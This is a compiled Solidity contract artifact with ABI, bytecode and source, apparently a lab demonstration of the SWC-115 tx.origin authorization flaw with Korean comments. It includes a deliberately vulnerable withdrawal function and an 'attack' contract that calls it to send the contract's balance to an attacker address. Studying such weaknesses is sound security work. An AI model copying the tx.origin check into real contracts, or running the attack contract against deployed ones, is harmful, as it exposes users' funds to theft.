{
  "contractName": "swc115",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "tx_origin",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "msg_sender",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "contract_addr_event",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "value_",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "ether_sender",
          "type": "address"
        }
      ],
      "name": "ether_storage",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "tx_origin",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "msg_sender",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "with_ether",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "contract_addr",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "a",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_recipient",
          "type": "address"
        }
      ],
      "name": "withdrawAll_txorigin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_recipient",
          "type": "address"
        }
      ],
      "name": "withdrawAll_sender",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061081d806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630dbe671f14610072578063785875ee1461007c5780638da5cb5b146100bf57806392fb388714610116578063d15ce8d914610159575b600080fd5b61007a61019c565b005b34801561008857600080fd5b506100bd600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610209565b005b3480156100cb57600080fd5b506100d4610338565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561012257600080fd5b50610157600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035d565b005b34801561016557600080fd5b5061019a600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506105e0565b005b7f3e518efe8b2cbe4f8dacbbf863372a8ea4c7ec14e16d6c62785183a98d5df4943433604051808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a1565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f82d82adcde9cc84345c43badd5a60cca006e924b293a827677c931d40063c0ef32336000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001935050505060405180910390a150565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610493576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252606e8152602001807f6d73672e73656e646572203d206f776e6572206e6f742073616d652c2066756e81526020017f6374696f6e2063616c6c206f6e6c79206f776e657221206f776e65722061646481526020017f72203a203078353061336337343630623362643131316234333330616339306681526020017f383431306337303835323938623700000000000000000000000000000000000081525060800191505060405180910390fd5b7f94e3e77baee778f6cd6d181bb433ad22882bb15dd8cefd6aaed6516cdeb6fdd932336000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001935050505060405180910390a18073ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156105dc573d6000803e3d6000fd5b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff161415156106a4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f6d73672e73656e646572203d206f776e6572206e6f742073616d65000000000081525060200191505060405180910390fd5b7f94e3e77baee778f6cd6d181bb433ad22882bb15dd8cefd6aaed6516cdeb6fdd932336000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001935050505060405180910390a18073ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156107ed573d6000803e3d6000fd5b50505600a165627a7a7230582058559d5e32d2e4907c06618d2b3352f1bc79d7dfa01277153ddd6f70a8edd83c0029",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\n//swc115는 공격을 받는 입장\ncontract swc115{\n    address public owner;\n    event contract_addr_event(address tx_origin, address msg_sender, address _owner);\n    event ether_storage(uint value_, address ether_sender);\n    event with_ether(address tx_origin, address msg_sender, address _owner);\n\n    //swc115 컨트랙트의 owner를 설정 owner = msg.sender = tx.origin\n    function contract_addr(address _owner){\n        owner = _owner;\n        emit contract_addr_event(tx.origin, msg.sender, owner);\n    }\n\n    //swc115 컨트랙트에 이더 값을 전송하는 부분\n    function a() public payable {\n        emit ether_storage(msg.value, msg.sender);\n    }\n\n    //tx.origin이 있어 취약한 함수, require를 우회하여 값을 출금해갈 수 있음\n    function withdrawAll_txorigin(address _recipient) public {\n        //require(tx.origin == owner);\n        require(tx.origin == owner,\n        \"msg.sender = owner not same\");\n        emit with_ether(tx.origin, msg.sender, owner);\n        _recipient.transfer(this.balance);\n    }\n    \n    //해당 함수는, tx.origin와 msg.sender를 비교하기 위해 추가한 함수\n    //여기선 msg.sender를 사용\n    function withdrawAll_sender(address _recipient) public {\n        //require(tx.origin == owner);\n        require(msg.sender == owner,\n        \"msg.sender = owner not same, function call only owner! owner addr : 0x50a3c7460b3bd111b4330ac90f8410c7085298b7\");\n        emit with_ether(tx.origin, msg.sender, owner);\n        _recipient.transfer(this.balance);\n    }\n}\n\ncontract attack{\n    swc115 swc115contract;\n    address attacker;\n\n    //swc115contract = 공격당하는 컨트랙트의 주소, attackaddress는 값을 받을 EOA 주소\n    function set(swc115 _swc115contract, address _attackaddress){\n        swc115contract = _swc115contract;\n        attacker = _attackaddress;\n    }\n    //tx.origin==owner가 설정된 함수를 호출\n    function attack_contract() payable{\n        swc115contract.withdrawAll_txorigin(attacker);\n    }\n\n    //msg.sender==owner가 설정된 함수를 호출\n    function attack_contract2() payable{\n        swc115contract.withdrawAll_sender(attacker);\n    }\n}",
  "sourcePath": "C:/Users/vlfgh/OneDrive/Desktop/swc-git/swc115/contracts/swc115.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.4.1",
  "updatedAt": "2021-08-14T06:00:52.962Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}